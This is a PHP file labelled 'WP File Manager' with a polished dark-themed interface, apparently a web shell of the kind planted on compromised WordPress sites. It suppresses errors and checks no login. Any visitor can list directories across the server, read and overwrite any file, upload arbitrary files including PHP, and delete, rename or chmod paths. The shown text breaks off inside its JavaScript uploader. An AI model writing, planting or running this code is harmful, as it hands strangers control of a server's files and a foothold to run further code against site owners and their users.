<?php
@ini_set('display_errors', 0);
@error_reporting(0);
session_start();

$banner      = "WP File Manager";
$home_dir    = dirname(__FILE__);                          // ← home = script's own dir
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $home_dir;

if ($current_dir === false || !is_dir($current_dir)) {
    $current_dir = $home_dir;
}
$current_dir = str_replace('\\', '/', $current_dir);
$home_dir    = str_replace('\\', '/', $home_dir);

$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

// ── AJAX chunk upload ─────────────────────────────────────────────
if ($action === 'upload_chunk') {
    header('Content-Type: application/json');
    $fname = isset($_POST['fname'])  ? basename($_POST['fname'])              : '';
    $chunk = isset($_POST['chunk'])  ? $_POST['chunk']                        : '';
    $index = isset($_POST['idx'])    ? intval($_POST['idx'])                  : 0;
    $total = isset($_POST['total'])  ? intval($_POST['total'])                : 1;
    $uid   = isset($_POST['uid'])    ? preg_replace('/[^a-f0-9]/','',$_POST['uid']) : '';
    if ($fname===''||$chunk===''||$uid===''){echo json_encode(['ok'=>false,'msg'=>'bad params']);exit;}
    $tmp  = sys_get_temp_dir().'/ufm_'.$uid.'_'.$index;
    $dec  = base64_decode($chunk);
    if($dec===false){echo json_encode(['ok'=>false,'msg'=>'decode failed']);exit;}
    file_put_contents($tmp,$dec);
    if($index===$total-1){
        $dest=$current_dir.'/'.$fname;
        $fp=fopen($dest,'wb');
        if(!$fp){echo json_encode(['ok'=>false,'msg'=>'cannot write']);exit;}
        for($i=0;$i<$total;$i++){
            $p=sys_get_temp_dir().'/ufm_'.$uid.'_'.$i;
            if(file_exists($p)){fwrite($fp,file_get_contents($p));unlink($p);}
        }
        fclose($fp);@chmod($dest,0644);
        echo json_encode(['ok'=>true,'msg'=>'done','size'=>filesize($dest)]);exit;
    }
    echo json_encode(['ok'=>true,'msg'=>'chunk '.$index]);exit;
}

// ── Standard upload fallback ──────────────────────────────────────
if ($action==='upload' && !empty($_FILES['file'])) {
    $fn=$_FILES['file']['name'];$tmp=$_FILES['file']['tmp_name'];$sz=$_FILES['file']['size'];
    if($sz>0&&is_uploaded_file($tmp))@move_uploaded_file($tmp,rtrim($current_dir,'/').'/'.$fn);
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── Delete ────────────────────────────────────────────────────────
if ($action==='delete' && !empty($_REQUEST['target'])) {
    $t=$_REQUEST['target'];
    if(is_file($t))@unlink($t);elseif(is_dir($t))@rmdir($t);
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── Rename ────────────────────────────────────────────────────────
if ($action==='rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
    @rename($_POST['old'],dirname($_POST['old']).'/'.$_POST['new']);
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── Chmod ─────────────────────────────────────────────────────────
if ($action==='chmod' && !empty($_POST['target']) && !empty($_POST['perms'])) {
    @chmod($_POST['target'],octdec($_POST['perms']));
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── Save edit ─────────────────────────────────────────────────────
if ($action==='save' && !empty($_POST['target']) && isset($_POST['content'])) {
    $fp=@fopen($_POST['target'],'w');
    if($fp){@fwrite($fp,$_POST['content']);@fclose($fp);}
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── New file ──────────────────────────────────────────────────────
if ($action==='newfile' && !empty($_POST['filename'])) {
    $nf=rtrim($current_dir,'/').'/'.basename(trim($_POST['filename']));
    if(!file_exists($nf)){@file_put_contents($nf,'');@chmod($nf,0644);}
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── New dir ───────────────────────────────────────────────────────
if ($action==='newdir' && !empty($_POST['dirname'])) {
    $nd=rtrim($current_dir,'/').'/'.basename(trim($_POST['dirname']));
    if(!file_exists($nd))@mkdir($nd,0755,true);
    header("Location: ?dir=".urlencode($current_dir));exit;
}

// ── Scan dir ──────────────────────────────────────────────────────
$items=[];
if($handle=@opendir($current_dir)){
    while(false!==($entry=readdir($handle))){
        if($entry==='.'||($entry==='..'&&$current_dir===dirname($current_dir)))continue;
        $fp=rtrim($current_dir,'/').'/'.$entry;
        $items[]=['name'=>$entry,'path'=>$fp,'is_dir'=>is_dir($fp),
                  'size'=>is_file($fp)?filesize($fp):0,
                  'perms'=>substr(sprintf('%o',fileperms($fp)),-4),
                  'mtime'=>filemtime($fp)];
    }
    closedir($handle);
}
usort($items,function($a,$b){
    if($a['is_dir']&&!$b['is_dir'])return -1;
    if(!$a['is_dir']&&$b['is_dir'])return 1;
    return strcasecmp($a['name'],$b['name']);
});

// ── Breadcrumb ────────────────────────────────────────────────────
$path_parts=explode('/',trim($current_dir,'/'));
$breadcrumb='';$built_path='';
if(substr($current_dir,0,1)==='/'){$built_path='/';$breadcrumb.='<a href="?dir=%2F">/</a>';}
foreach($path_parts as $part){
    if($part==='')continue;
    $built_path.='/'.$part;
    $breadcrumb.=' <span class="bc-sep">›</span> <a href="?dir='.urlencode($built_path).'">'.htmlspecialchars($part).'</a>';
}

$edit_target=isset($_GET['edit'])?$_GET['edit']:'';
$edit_content='';
if($edit_target&&is_file($edit_target))$edit_content=@file_get_contents($edit_target);

function fmtSize($b){
    if($b>=1073741824)return number_format($b/1073741824,2).' GB';
    if($b>=1048576)return number_format($b/1048576,2).' MB';
    if($b>=1024)return number_format($b/1024,2).' KB';
    return $b.' B';
}
$total_size=array_sum(array_column(array_filter($items,function($i){return!$i['is_dir'];}),'size'));
$dir_count=count(array_filter($items,function($i){return $i['is_dir'];}));
$file_count=count(array_filter($items,function($i){return!$i['is_dir'];}));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo htmlspecialchars($banner); ?></title>
<style>
/* ── reset & tokens ─────────────────────────────────────────── */
*{box-sizing:border-box;margin:0;padding:0;}
:root{
    --bg:        #07090f;
    --surface:   #0d1117;
    --card:      #111622;
    --border:    #1e2a3a;
    --border2:   #263347;
    --g1:        #00ffa3;
    --g2:        #00c8ff;
    --g3:        #7c3aed;
    --text:      #dce8f5;
    --muted:     #5a7290;
    --danger:    #ff4466;
    --warn:      #f59e0b;
    --radius:    10px;
    --radius-sm: 6px;
    --shadow:    0 8px 32px rgba(0,0,0,.55);
}

/* ── base ───────────────────────────────────────────────────── */
html,body{min-height:100vh;}
body{
    background:var(--bg);
    color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    font-size:13px;
    line-height:1.55;
    padding:0;
}

/* ── layout ─────────────────────────────────────────────────── */
.shell{display:flex;flex-direction:column;min-height:100vh;}

/* ── topbar ─────────────────────────────────────────────────── */
.topbar{
    background:var(--card);
    border-bottom:1px solid var(--border);
    padding:14px 24px 12px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:16px;
    position:sticky;top:0;z-index:100;
    backdrop-filter:blur(12px);
    box-shadow:0 2px 24px rgba(0,0,0,.4);
}
.topbar-left{display:flex;align-items:center;gap:14px;flex:1;}
.logo-mark{
    width:34px;height:34px;border-radius:8px;
    background:linear-gradient(135deg,var(--g1),var(--g2));
    display:flex;align-items:center;justify-content:center;
    font-size:17px;font-weight:900;color:#07090f;
    box-shadow:0 0 16px rgba(0,255,163,.25);
    flex-shrink:0;
}

/* center block */
.topbar-center{
    flex:2;
    display:flex;flex-direction:column;
    align-items:center;justify-content:center;
    text-align:center;
    gap:3px;
}
.app-title{
    font-size:16px;font-weight:800;
    background:linear-gradient(90deg,var(--g1),var(--g2));
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
    letter-spacing:.4px;
    line-height:1.2;
}
.app-sub{font-size:11px;color:var(--muted);margin-top:1px;}
.app-tagline{
    font-size:12px;
    color:#ffffff;
    font-weight:400;
    letter-spacing:.1px;
    line-height:1.4;
}
.app-tagline .red-bold{
    color:#ff3355;
    font-weight:800;
}

.topbar-right{display:flex;align-items:center;gap:8px;flex:1;justify-content:flex-end;}

/* ── content wrapper ─────────────────────────────────────────── */
.content{flex:1;padding:24px;max-width:1360px;margin:0 auto;width:100%;}

/* ── path bar ───────────────────────────────────────────────── */
.path-panel{
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    padding:10px 16px;
    margin-bottom:18px;
    display:flex;
    align-items:center;
    gap:12px;
    overflow-x:auto;
    box-shadow:var(--shadow);
}
.path-icon{color:var(--g1);flex-shrink:0;font-size:16px;}
.crumbs{display:flex;align-items:center;gap:0;flex-wrap:wrap;font-size:12.5px;font-family:monospace;}
.crumbs a{
    color:var(--g2);text-decoration:none;padding:2px 4px;border-radius:4px;
    transition:background .15s;
}
.crumbs a:hover{background:rgba(0,200,255,.1);}
.bc-sep{color:var(--muted);margin:0 2px;font-size:11px;}

/* ── stats strip ────────────────────────────────────────────── */
.stats-strip{
    display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap;
}
.stat-card{
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    padding:12px 20px;
    flex:1;min-width:120px;
    display:flex;flex-direction:column;gap:4px;
    box-shadow:var(--shadow);
    transition:border-color .2s;
}
.stat-card:hover{border-color:var(--border2);}
.stat-val{font-size:22px;font-weight:800;color:var(--text);}
.stat-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;}
.stat-card.green .stat-val{color:var(--g1);}
.stat-card.blue  .stat-val{color:var(--g2);}
.stat-card.purple.stat-val{color:#a78bfa;}

/* ── toolbar panel ───────────────────────────────────────────── */
.toolbar-panel{
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    padding:16px 20px;
    margin-bottom:18px;
    box-shadow:var(--shadow);
}
.toolbar-row{display:flex;gap:16px;align-items:flex-end;flex-wrap:wrap;}
.toolbar-section{display:flex;flex-direction:column;gap:6px;min-width:0;}
.toolbar-label{
    font-size:10px;font-weight:700;text-transform:uppercase;
    letter-spacing:.7px;color:var(--muted);
}
.toolbar-inline{display:flex;gap:7px;align-items:center;}
.toolbar-divider{
    width:1px;align-self:stretch;
    background:var(--border);margin:0 2px;
}

/* ── upload zone ─────────────────────────────────────────────── */
.drop-zone{
    border:2px dashed var(--border2);
    border-radius:var(--radius);
    padding:12px 18px;
    display:flex;align-items:center;gap:14px;
    cursor:pointer;
    transition:border-color .2s,background .2s;
    background:rgba(255,255,255,.018);
    min-width:260px;
    flex-wrap:wrap;
}
.drop-zone:hover,.drop-zone.drag-over{
    border-color:var(--g1);
    background:rgba(0,255,163,.04);
}
.drop-zone input[type="file"]{display:none;}
.file-label-txt{
    font-size:12px;color:var(--muted);font-family:monospace;
    min-width:140px;max-width:220px;overflow:hidden;
    text-overflow:ellipsis;white-space:nowrap;
}
.prog-wrap{display:none;flex-direction:column;gap:4px;flex:1;min-width:160px;}
.prog-wrap.on{display:flex;}
.prog-bg{height:5px;background:var(--border);border-radius:3px;overflow:hidden;}
.prog-fill{
    height:100%;width:0%;border-radius:3px;
    background:linear-gradient(90deg,var(--g1),var(--g2));
    transition:width .1s;
    box-shadow:0 0 8px rgba(0,255,163,.4);
}
.prog-txt{font-size:11px;color:var(--muted);font-family:monospace;}
.up-status{
    font-size:11.5px;font-weight:700;padding:3px 10px;border-radius:4px;display:none;
}
.up-status.ok {display:inline-block;background:rgba(0,255,163,.12);color:var(--g1);}
.up-status.err{display:inline-block;background:rgba(255,68,102,.12);color:var(--danger);}

/* ── inline create ───────────────────────────────────────────── */
.create-wrap{display:none;gap:7px;align-items:center;}
.create-wrap.on{display:flex;}
.create-wrap input[type="text"]{
    width:170px;padding:7px 11px;font-size:12.5px;
    border-radius:var(--radius-sm);
    background:var(--surface);border:1.5px solid var(--g1);
    color:var(--text);font-family:monospace;outline:none;
    box-shadow:0 0 0 0 transparent;
    transition:box-shadow .2s;
}
.create-wrap input[type="text"]:focus{
    box-shadow:0 0 0 3px rgba(0,255,163,.18);
}

/* ── buttons ─────────────────────────────────────────────────── */
.btn{
    display:inline-flex;align-items:center;gap:6px;
    padding:7px 14px;border-radius:var(--radius-sm);
    border:1px solid transparent;cursor:pointer;
    font-size:12.5px;font-weight:700;
    text-decoration:none;white-space:nowrap;
    transition:all .18s;line-height:1;
}
.btn-green{
    background:linear-gradient(135deg,rgba(0,255,163,.18),rgba(0,200,255,.12));
    color:var(--g1);border-color:rgba(0,255,163,.3);
}
.btn-green:hover{background:linear-gradient(135deg,rgba(0,255,163,.28),rgba(0,200,255,.2));
    box-shadow:0 0 16px rgba(0,255,163,.2);transform:translateY(-1px);}

.btn-blue{
    background:linear-gradient(135deg,rgba(0,200,255,.18),rgba(0,160,255,.12));
    color:var(--g2);border-color:rgba(0,200,255,.3);
}
.btn-blue:hover{background:linear-gradient(135deg,rgba(0,200,255,.28),rgba(0,160,255,.2));
    box-shadow:0 0 16px rgba(0,200,255,.2);transform:translateY(-1px);}

.btn-purple{
    background:linear-gradient(135deg,rgba(124,58,237,.25),rgba(109,40,217,.15));
    color:#a78bfa;border-color:rgba(124,58,237,.35);
}
.btn-purple:hover{background:linear-gradient(135deg,rgba(124,58,237,.38),rgba(109,40,217,.25));
    box-shadow:0 0 16px rgba(124,58,237,.25);transform:translateY(-1px);}

.btn-ghost{
    background:transparent;color:var(--muted);
    border-color:var(--border);
}
.btn-ghost:hover{background:var(--border);color:var(--text);transform:translateY(-1px);}

.btn-danger-soft{
    background:rgba(255,68,102,.1);color:var(--danger);
    border-color:rgba(255,68,102,.25);
}
.btn-danger-soft:hover{background:rgba(255,68,102,.22);
    box-shadow:0 0 14px rgba(255,68,102,.2);transform:translateY(-1px);}

.btn-home{
    background:linear-gradient(135deg,rgba(245,158,11,.18),rgba(251,191,36,.1));
    color:var(--warn);border-color:rgba(245,158,11,.3);
}
.btn-home:hover{background:linear-gradient(135deg,rgba(245,158,11,.28),rgba(251,191,36,.18));
    box-shadow:0 0 16px rgba(245,158,11,.2);transform:translateY(-1px);}

.btn-sm{padding:5px 10px;font-size:11.5px;}

.btn-cancel-x{
    background:transparent;border:1px solid var(--border);
    color:var(--muted);padding:6px 10px;border-radius:var(--radius-sm);
    font-size:12px;cursor:pointer;font-weight:700;transition:all .15s;
}
.btn-cancel-x:hover{border-color:var(--danger);color:var(--danger);}

/* ── file table ──────────────────────────────────────────────── */
.table-wrap{
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    overflow:hidden;
    box-shadow:var(--shadow);
}
.table-header{
    padding:12px 20px;
    border-bottom:1px solid var(--border);
    display:flex;align-items:center;justify-content:space-between;
    gap:12px;flex-wrap:wrap;
}
.table-title{
    font-size:13px;font-weight:700;color:var(--text);
    display:flex;align-items:center;gap:8px;
}
.search-box{
    background:var(--surface);
    border:1px solid var(--border);
    border-radius:var(--radius-sm);
    padding:6px 12px 6px 32px;
    color:var(--text);font-size:12.5px;outline:none;
    width:220px;position:relative;
    transition:border-color .2s;
}
.search-box:focus{border-color:var(--g2);}
.search-wrap{position:relative;display:inline-block;}
.search-wrap::before{
    content:'⌕';position:absolute;left:10px;top:50%;transform:translateY(-50%);
    color:var(--muted);font-size:14px;pointer-events:none;
}
table{width:100%;border-collapse:collapse;}
thead tr{background:var(--surface);}
th{
    padding:10px 16px;text-align:left;
    font-size:10.5px;font-weight:700;
    text-transform:uppercase;letter-spacing:.7px;
    color:var(--muted);border-bottom:1px solid var(--border);
    white-space:nowrap;
}
td{
    padding:11px 16px;border-bottom:1px solid var(--border);
    font-size:12.5px;vertical-align:middle;
}
tbody tr:last-child td{border-bottom:none;}
tbody tr{transition:background .12s;}
tbody tr:hover td{background:rgba(255,255,255,.025);}

.name-cell{display:flex;align-items:center;gap:9px;}
.file-icon{font-size:16px;line-height:1;flex-shrink:0;}
.name-link{
    color:var(--text);text-decoration:none;
    font-weight:500;word-break:break-all;
    transition:color .15s;
}
.name-link:hover{color:var(--g1);}
.dir-link{color:#93c5fd;font-weight:600;}
.dir-link:hover{color:var(--g2);}

.ext-badge{
    font-size:9.5px;font-weight:800;padding:2px 5px;
    border-radius:3px;text-transform:uppercase;letter-spacing:.4px;
    background:rgba(255,255,255,.07);color:var(--muted);flex-shrink:0;
}
.ext-php{background:rgba(139,92,246,.18);color:#c4b5fd;}
.ext-html{background:rgba(249,115,22,.15);color:#fb923c;}
.ext-js{background:rgba(234,179,8,.15);color:#fbbf24;}
.ext-css{background:rgba(14,165,233,.15);color:#38bdf8;}
.ext-zip{background:rgba(239,68,68,.15);color:#fca5a5;}
.ext-sql{background:rgba(16,185,129,.15);color:#6ee7b7;}
.ext-img{background:rgba(236,72,153,.15);color:#f9a8d4;}
.ext-txt{background:rgba(148,163,184,.12);color:#94a3b8;}

.perm-code{
    font-family:monospace;font-size:11.5px;padding:2px 7px;
    border-radius:4px;background:rgba(255,255,255,.05);color:var(--muted);
}
.inline-form{display:inline-flex;gap:5px;align-items:center;}
.perm-input{
    background:var(--surface);border:1px solid var(--border);
    color:var(--text);padding:4px 7px;border-radius:4px;
    font-family:monospace;font-size:12px;width:52px;
    transition:border-color .15s;
}
.perm-input:focus{border-color:var(--g1);outline:none;}
.rename-input{
    background:var(--surface);border:1px solid var(--border);
    color:var(--text);padding:4px 7px;border-radius:4px;
    font-family:monospace;font-size:12px;width:100px;
    transition:border-color .15s;
}
.rename-input:focus{border-color:var(--g2);outline:none;}
.actions-row{display:flex;gap:6px;align-items:center;justify-content:flex-end;}

.size-cell{font-family:monospace;color:var(--muted);font-size:12px;}
.date-cell{font-family:monospace;color:var(--muted);font-size:11.5px;white-space:nowrap;}

/* parent row */
.parent-row td{padding:9px 16px;}
.parent-link{color:#93c5fd;text-decoration:none;font-weight:600;font-size:13px;
    display:inline-flex;align-items:center;gap:7px;transition:color .15s;}
.parent-link:hover{color:var(--g2);}

/* empty state */
.empty-state{
    padding:48px 24px;text-align:center;color:var(--muted);
}
.empty-icon{font-size:40px;margin-bottom:12px;opacity:.4;}
.empty-text{font-size:14px;}

/* ── editor ──────────────────────────────────────────────────── */
.editor-panel{
    background:var(--card);border:1px solid var(--border);
    border-radius:var(--radius);overflow:hidden;
    box-shadow:var(--shadow);margin-bottom:18px;
}
.editor-topbar{
    padding:12px 20px;border-bottom:1px solid var(--border);
    display:flex;align-items:center;justify-content:space-between;
    flex-wrap:wrap;gap:10px;
    background:var(--surface);
}
.editor-title{
    font-size:13.5px;font-weight:700;
    display:flex;align-items:center;gap:8px;
}
.editor-hint{font-size:11px;color:var(--muted);}
.editor-body{padding:16px 20px;}
.code-area{
    width:100%;height:520px;
    background:#060a10;color:#7dd3fc;
    border:1px solid var(--border);border-radius:var(--radius-sm);
    font-family:'Fira Code','Cascadia Code',ui-monospace,monospace;
    font-size:13px;line-height:1.65;padding:16px;
    resize:vertical;outline:none;
    transition:border-color .2s;
}
.code-area:focus{border-color:var(--g2);}
.editor-footer{
    padding:12px 20px;border-top:1px solid var(--border);
    display:flex;align-items:center;justify-content:flex-end;gap:10px;
    background:var(--surface);
}

/* ── scrollbar ───────────────────────────────────────────────── */
::-webkit-scrollbar{width:6px;height:6px;}
::-webkit-scrollbar-track{background:var(--bg);}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
::-webkit-scrollbar-thumb:hover{background:var(--muted);}

/* ── responsive ──────────────────────────────────────────────── */
@media(max-width:700px){
    .content{padding:14px;}
    .stats-strip{gap:8px;}
    .stat-card{padding:10px 14px;}
    .stat-val{font-size:18px;}
    .topbar{padding:0 14px;}
    .search-box{width:100%;}
    th:nth-child(3),td:nth-child(3),
    th:nth-child(4),td:nth-child(4){display:none;}
}
</style>
</head>
<body>
<div class="shell">

<!-- ── top bar ──────────────────────────────────────────────── -->
<header class="topbar">

    <!-- left: logo + php info -->
    <div class="topbar-left">
        <div class="logo-mark">X</div>
        <div class="app-sub">PHP <?php echo PHP_VERSION; ?><br><?php echo PHP_OS; ?></div>
    </div>

    <!-- center: banner + tagline -->
    <!-- right: nav buttons -->
    <div class="topbar-right">
        <a href="?dir=<?php echo urlencode($home_dir); ?>" class="btn btn-home btn-sm"
           title="Go to file manager home directory">
            &#127968; Home
        </a>
        <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn btn-ghost btn-sm"
           title="Parent directory">
            &#8593; Up
        </a>
        <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-ghost btn-sm"
           title="Refresh">
            &#8635; Refresh
        </a>
    </div>

</header>

<!-- ── main content ─────────────────────────────────────────── -->
<main class="content">

    <!-- path bar -->
    <div class="path-panel">
        <span class="path-icon">&#128193;</span>
        <div class="crumbs"><?php echo $breadcrumb; ?></div>
    </div>

    <?php if ($edit_target): ?>
    <!-- ══ EDITOR ══ -->
    <div class="editor-panel">
        <div class="editor-topbar">
            <div class="editor-title">
                <span>&#9998;</span>
                <span>Editing: <code style="color:var(--g2);"><?php echo htmlspecialchars(basename($edit_target)); ?></code></span>
            </div>
            <span class="editor-hint">Ctrl + S to save</span>
        </div>
        <form method="POST" action="?dir=<?php echo urlencode($current_dir); ?>&action=save" id="editForm">
            <div class="editor-body">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($edit_target); ?>">
                <textarea name="content" class="code-area" id="codeArea"
                    onkeydown="if((event.ctrlKey||event.metaKey)&&event.key==='s'){event.preventDefault();document.getElementById('editForm').submit();}"
                ><?php echo htmlspecialchars($edit_content); ?></textarea>
            </div>
            <div class="editor-footer">
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-ghost">Cancel</a>
                <button type="submit" class="btn btn-green">&#10003; Save Changes</button>
            </div>
        </form>
    </div>

    <?php else: ?>

    <!-- ══ STATS STRIP ══ -->
    <div class="stats-strip">
        <div class="stat-card green">
            <span class="stat-val"><?php echo $file_count; ?></span>
            <span class="stat-lbl">Files</span>
        </div>
        <div class="stat-card blue">
            <span class="stat-val"><?php echo $dir_count; ?></span>
            <span class="stat-lbl">Folders</span>
        </div>
        <div class="stat-card purple">
            <span class="stat-val" style="color:#a78bfa;"><?php echo fmtSize($total_size); ?></span>
            <span class="stat-lbl">Total Size</span>
        </div>
        <div class="stat-card">
            <span class="stat-val" style="font-size:14px;color:var(--muted);word-break:break-all;">
                <?php echo htmlspecialchars(basename($current_dir)); ?>
            </span>
            <span class="stat-lbl">Current Dir</span>
        </div>
    </div>

    <!-- ══ TOOLBAR ══ -->
    <div class="toolbar-panel">
        <div class="toolbar-row">

            <!-- Upload -->
            <div class="toolbar-section" style="flex:1;min-width:260px;">
                <span class="toolbar-label">Upload File</span>
                <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                    <input type="file" id="fileInput" multiple>
                    <button type="button" class="btn btn-green btn-sm"
                            onclick="event.stopPropagation();document.getElementById('fileInput').click();">
                        &#8679; Select
                    </button>
                    <span class="file-label-txt" id="fileLabel">or drag &amp; drop</span>
                    <div class="prog-wrap" id="progWrap">
                        <div class="prog-bg"><div class="prog-fill" id="progFill"></div></div>
                        <span class="prog-txt" id="progTxt">0%</span>
                    </div>
                    <span class="up-status" id="upStatus"></span>
                </div>
            </div>

            <div class="toolbar-divider"></div>

            <!-- New File -->
            <div class="toolbar-section">
                <span class="toolbar-label">New File</span>
                <div class="toolbar-inline">
                    <button type="button" id="btnFile" onclick="toggleCreate('file')" class="btn btn-blue">
                        &#65291; New File
                    </button>
                    <form class="create-wrap" id="wrapFile" method="POST"
                          action="?dir=<?php echo urlencode($current_dir); ?>&action=newfile">
                        <input type="text" name="filename" id="inpFile"
                               placeholder="index.php"
                               onkeydown="ckCreate(event,this)"
                               autocomplete="off" spellcheck="false">
                        <button type="submit" class="btn btn-blue btn-sm">Create</button>
                        <button type="button" class="btn-cancel-x" onclick="cancelCreate('file')">&#10005;</button>
                    </form>
                </div>
            </div>

            <div class="toolbar-divider"></div>

            <!-- New Directory -->
            <div class="toolbar-section">
                <span class="toolbar-label">New Directory</span>
                <div class="toolbar-inline">
                    <button type="button" id="btnDir" onclick="toggleCreate('dir')" class="btn btn-purple">
                        &#65291; New Directory
                    </button>
                    <form class="create-wrap" id="wrapDir" method="POST"
                          action="?dir=<?php echo urlencode($current_dir); ?>&action=newdir">
                        <input type="text" name="dirname" id="inpDir"
                               placeholder="my-folder"
                               onkeydown="ckCreate(event,this)"
                               autocomplete="off" spellcheck="false">
                        <button type="submit" class="btn btn-purple btn-sm">Create</button>
                        <button type="button" class="btn-cancel-x" onclick="cancelCreate('dir')">&#10005;</button>
                    </form>
                </div>
            </div>

        </div>
    </div>

    <!-- ══ FILE TABLE ══ -->
    <div class="table-wrap">
        <div class="table-header">
            <div class="table-title">
                <span>&#128196;</span>
                <span>Contents</span>
                <span style="color:var(--muted);font-weight:400;font-size:12px;">
                    (<?php echo $file_count + $dir_count; ?> items)
                </span>
            </div>
            <div class="search-wrap">
                <input type="text" class="search-box" id="searchBox" placeholder="Search…"
                       oninput="filterTable(this.value)">
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th style="width:38%;">Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th style="text-align:right;">Actions</th>
                </tr>
            </thead>
            <tbody id="fileBody">

            <?php if ($current_dir !== dirname($current_dir)): ?>
            <tr class="parent-row">
                <td colspan="5">
                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="parent-link">
                        <span>&#8593;</span> Parent Directory
                    </a>
                </td>
            </tr>
            <?php endif; ?>

            <?php if(empty($items)): ?>
            <tr><td colspan="5">
                <div class="empty-state">
                    <div class="empty-icon">&#128194;</div>
                    <div class="empty-text">This directory is empty.</div>
                </div>
            </td></tr>
            <?php endif; ?>

            <?php foreach($items as $item):
                $ext = strtolower(pathinfo($item['name'],PATHINFO_EXTENSION));
                $ext_class = in_array($ext,['php']) ? 'ext-php'
                           : (in_array($ext,['html','htm']) ? 'ext-html'
                           : (in_array($ext,['js']) ? 'ext-js'
                           : (in_array($ext,['css']) ? 'ext-css'
                           : (in_array($ext,['zip','rar','gz','tar']) ? 'ext-zip'
                           : (in_array($ext,['sql','db']) ? 'ext-sql'
                           : (in_array($ext,['jpg','jpeg','png','gif','webp','svg']) ? 'ext-img'
                           : (in_array($ext,['txt','md','log']) ? 'ext-txt'
                           : '')))))));
                $icon = $item['is_dir'] ? '&#128193;' : '&#128196;';
            ?>
            <tr>
                <td>
                    <div class="name-cell">
                        <span class="file-icon"><?php echo $icon; ?></span>
                        <?php if (!$item['is_dir'] && $ext): ?>
                        <span class="ext-badge <?php echo $ext_class; ?>"><?php echo htmlspecialchars($ext); ?></span>
                        <?php elseif($item['is_dir']): ?>
                        <span class="ext-badge" style="background:rgba(147,197,253,.1);color:#93c5fd;">dir</span>
                        <?php endif; ?>
                        <?php if ($item['is_dir']): ?>
                            <a href="?dir=<?php echo urlencode($item['path']); ?>"
                               class="name-link dir-link"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php else: ?>
                            <a href="?edit=<?php echo urlencode($item['path']); ?>&dir=<?php echo urlencode($current_dir); ?>"
                               class="name-link"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php endif; ?>
                    </div>
                </td>
                <td class="size-cell"><?php echo $item['is_dir'] ? '—' : fmtSize($item['size']); ?></td>
                <td>
                    <form class="inline-form" method="POST"
                          action="?dir=<?php echo urlencode($current_dir); ?>&action=chmod">
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($item['path']); ?>">
                        <input class="perm-input" type="text" name="perms"
                               value="<?php echo $item['perms']; ?>" maxlength="4">
                        <button type="submit" class="btn btn-ghost btn-sm">Set</button>
                    </form>
                </td>
                <td class="date-cell"><?php echo date('Y-m-d H:i',$item['mtime']); ?></td>
                <td>
                    <div class="actions-row">
                        <form class="inline-form" method="POST"
                              action="?dir=<?php echo urlencode($current_dir); ?>&action=rename">
                            <input type="hidden" name="old" value="<?php echo htmlspecialchars($item['path']); ?>">
                            <input class="rename-input" type="text" name="new"
                                   placeholder="New name" required>
                            <button type="submit" class="btn btn-green btn-sm">Rename</button>
                        </form>
                        <a class="btn btn-danger-soft btn-sm"
                           href="?dir=<?php echo urlencode($current_dir); ?>&action=delete&target=<?php echo urlencode($item['path']); ?>"
                           onclick="return confirm('Delete <?php echo addslashes(htmlspecialchars($item['name'])); ?>?');">
                            &#128465; Delete
                        </a>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>

            </tbody>
        </table>
    </div>

    <?php endif; ?>
</main>
</div><!-- /.shell -->

<script>
// ── AJAX chunked uploader ─────────────────────────────────────────
(function(){
    var CHUNK = 256*1024;
    var dir   = <?php echo json_encode($current_dir); ?>;
    var ep    = location.pathname+'?dir='+encodeURIComponent(dir)+'&action=upload_chunk';

    var dz    = document.getElementById('dropZone');
    var fi    = document.getElementById('fileInput');
    var lbl   = document.getElementById('fileLabel');
    var pw    = document.getElementById('progWrap');
    var pf    = document.getElementById('progFill');
    var pt    = document.getElementById('progTxt');
    var st    = document.getElementById('upStatus');

    dz.addEventListener('dragover',function(e){e.preventDefault();dz.classList.add('drag-over');});
    dz.addEventListener('dragleave',function(){dz.classList.remove('drag-over');});
    dz.addEventListener('drop',function(e){
        e.preventDefault();dz.classList.remove('drag-over');
        if(e.dataTransfer.files.length)upload(e.dataTransfer.files);
    });
    fi.addEventListener('change',function(){if(this.files.length)upload(this.files);});

    function uid(){return Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,10);}
    function status(m,t){st.textContent=m;st.className='up-status '+t;}

    function upload(files){
        var list=Array.prototype.slice.call(files);
        (function next(){if(!list.length)return;one(list.shift(),next);})();
    }

    function one(file,done){
        var total=Math.ceil(file.size/CHUNK)||1,id=uid(),idx=0;
        lbl.textContent=file.name;
        pw.classList.add('on');pf.style.width='0%';pt.textContent='0%';
        st.className='up-status';

        function send(){
